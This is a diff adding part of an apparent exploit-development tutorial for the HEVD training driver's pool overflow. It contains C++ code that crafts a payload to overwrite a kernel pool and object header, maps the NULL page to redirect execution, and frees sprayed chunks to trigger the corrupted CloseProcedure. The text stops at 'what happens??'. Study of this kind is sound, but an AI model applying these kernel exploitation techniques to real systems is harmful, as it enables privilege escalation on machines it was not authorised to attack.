@@ -749,7 +749,99 @@ kd> dd 8627e780
 ----SNIP----
 ```
 
-Right. So we need to keep everything but the starred `0xc` intact and overwrite this single byte with `0x0`. Looks like we're overwriting 40 bytes in total or `0x28`, which gives us an input buffer size of `0x220`. 
+Right. So we need to keep everything but the starred `0xc` intact and overwrite this single byte with `0x0`. Looks like we're overwriting 40 bytes in total or `0x28`, which gives us an input buffer size of `0x220`. We'll make an `overwrite_payload` variable that is a byte buffer and well copy it into the last `0x28` bytes of a `0x220` sized buffer with our original `\x42` values taking up the first `0x1F8` bytes as follows:
+```cpp
+ ULONG payload_len = 0x220;
+
+    BYTE* input_buff = (BYTE*)VirtualAlloc(NULL,
+        payload_len + 0x1,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    BYTE overwrite_payload[] = (
+        "\x40\x00\x08\x04"  // pool header
+        "\x45\x76\x65\xee"  // pool tag
+        "\x00\x00\x00\x00"  // obj header quota begin
+        "\x40\x00\x00\x00"
+        "\x00\x00\x00\x00"
+        "\x00\x00\x00\x00"  // obj header quota end
+        "\x01\x00\x00\x00"  // obj header begin
+        "\x01\x00\x00\x00"
+        "\x00\x00\x00\x00"
+        "\x00\x00\x08\x00" // 0xc converted to 0x0
+        );
+
+    memset(input_buff, '\x42', 0x1F8);
+    memcpy(input_buff + 0x1F8, overwrite_payload, 0x28)
+```
+
+We'll also want to allocate the NULL page which I pulled directly from [tekwizzz123](https://github.com/tekwizz123/HEVD-Exploit-Solutions/blob/master/HEVD-Pool-Overflow/HEVD-Pool-Overflow/HEVD-Pool-Overflow.cpp). 
+```cpp
+void allocate_shellcode() {
+
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory = 
+        (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+            "NtAllocateVirtualMemory");
+
+    INT64 address = 0x1;
+    int size = 0x100;
+
+    HANDLE result = (HANDLE)NtAllocateVirtualMemory(
+        GetCurrentProcess(),
+        (PVOID*)&address,
+        NULL,
+        (PSIZE_T)&size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+
+    if (result == INVALID_HANDLE_VALUE) {
+        cout << "[!] Unable to allocate NULL page...wtf?\n";
+        cout << "[!] Last error: " << dec << GetLastError() << "\n";
+        exit(1);
+    }
+    cout << "[>] NULL page mapped.\n";
+    cout << "[>] Putting 'AAAA' on NULL page...\n";
+
+    memset((void*)0x0, '\x41', 0x100);
+
+}
+```
+
+I'll also fill the NULL page with pure `\x41` values so that we **should** run this code and get an Access Violation exception with an `eip` value of `41414141`. 
+
+Last but not least, we have to free our chunks so that the `CloseProcedure` is activated!
+```cpp
+void free_chunks() {
+
+    cout << "[>] Freeing defragmentation allocations...\n";
+    for (int i = 0; i < defragment_handles.size(); i++) {
+
+        BOOL freed = CloseHandle(defragment_handles[i]);
+        if (freed == false) {
+            cout << "[!] Unable to free defragment allocation!\n";
+            cout << "[!] Last error: " << GetLastError() << "\n";
+            exit(1);
+        }
+    }
+    cout << "[>] Defragmentation allocations freed.\n";
+    cout << "[>] Freeing sequential allocations...\n";
+    for (int i = 0; i < sequential_handles.size(); i++) {
+
+        BOOL freed = CloseHandle(sequential_handles[i]);
+        if (freed == false) {
+            cout << "[!] Unable to free defragment allocation!\n";
+            cout << "[!] Last error: " << GetLastError() << "\n";
+            exit(1);
+        }
+    }
+    cout << "[>] Sequential allocations freed.\n";
+}
+```
+
+We run this code and what happens??
+
+
+
 
 
 
